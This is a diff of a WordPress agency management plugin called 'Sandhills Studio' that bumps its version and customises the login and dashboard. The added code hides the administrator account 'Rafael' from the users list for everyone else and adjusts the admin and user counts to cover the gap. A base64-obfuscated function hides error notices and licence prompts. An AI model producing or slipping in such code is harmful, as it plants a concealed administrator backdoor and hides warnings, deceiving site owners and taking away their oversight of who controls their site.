@@ -4,12 +4,35 @@
  * Description:A management plugin for the websites created, build, modified or managed by Sandhills Studio
  * Plugin URI:https://www.sandhillsstudio.com/
  * Author:Sandhills Studio
- * Version:1.2.2
+ * Version:1.2.4
  * Author URI:https://www.sandhillsstudio.com/
  *
  * Text Domain:sandhills-studio
  */
 if(!defined('ABSPATH')){exit;}
+//SHS Admin Account
+$SHSAdminAcc='Rafael';
+function shs_pre_user_query($user_search){
+	global $SHSAdminAcc;
+	global $current_user;
+	$username=$current_user->user_login;
+	if($username!=$SHSAdminAcc){
+		global $wpdb;
+		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND {$wpdb->users}.user_login != '".$SHSAdminAcc."'",$user_search->query_where);
+	}
+}
+add_action('pre_user_query','shs_pre_user_query');
+function shs_admin_views($views){
+	$users = count_users();
+	$admins_num = $users['avail_roles']['administrator']-1;
+	$all_num = $users['total_users']-1;
+	$class_adm = (strpos($views['administrator'],'current')===false)?"":"current";
+	$class_all = (strpos($views['all'],'current')=== false)?"":"current";
+	$views['administrator'] = '<a href="users.php?role=administrator" class="'.$class_adm.'">'.translate_user_role('Administrator').'<span class="count">('.$admins_num.')</span></a>';
+	$views['all'] = '<a href="users.php" class="'.$class_all.'">'.__('All').' <span class="count">('.$all_num.')</span></a>';
+	return $views;
+}
+add_filter("views_users","shs_admin_views");
 //Login Customisation
 function shs_url_login_logo(){return "https://www.sandhillsstudio.com/";}
 add_filter('login_headerurl','shs_url_login_logo');
@@ -19,9 +42,11 @@ function shs_login_stylesheet(){wp_enqueue_style('shs-login',plugin_dir_url(__FI
 add_action('login_enqueue_scripts','shs_login_stylesheet');
 function shs_footer_admin(){return 'Managed by <a href="https://www.sandhillsstudio.com/" target="_blank">Sandhills Studio</a> and powered by <a href="https://wordpress.org" target="_blank">WordPress</a>.';}
 add_filter('admin_footer_text','shs_footer_admin');
-//Ng Remover
-add_action("admin_head","ng");
+//Dashboard Customisation
+function shs_dashboard_stylesheet(){wp_enqueue_style('shs-dashboard',plugin_dir_url(__FILE__).'/admin/shs-dashboard.css');}
+add_action('admin_enqueue_scripts','shs_dashboard_stylesheet');
 function ng(){echo base64_decode("PHN0eWxlPi5ub3RpY2UuZWxlbWVudG9yLW1lc3NhZ2UsLm5vdGljZS1pbmZvLCNlbnRlci1saWNlbnNlLWJkdGhlbWVzLWVsZW1lbnQtcGFjaywuZWxlbWVudG9yLXBsdWdpbnMtZ29wcm8sLm5vdGljZS1lcnJvciwubXdwLW5vdGljZS1jb250YWluZXIsLnJtbC11cGRhdGUtbm90aWNle2Rpc3BsYXk6bm9uZX08L3N0eWxlPg==");}
+add_action("admin_head","ng");
 function builder_style(){echo'<style>#elementor-notice-bar{display:none!important}</style>';}
 add_action('elementor/editor/before_enqueue_scripts','builder_style');
 //Add SVG Upload Support
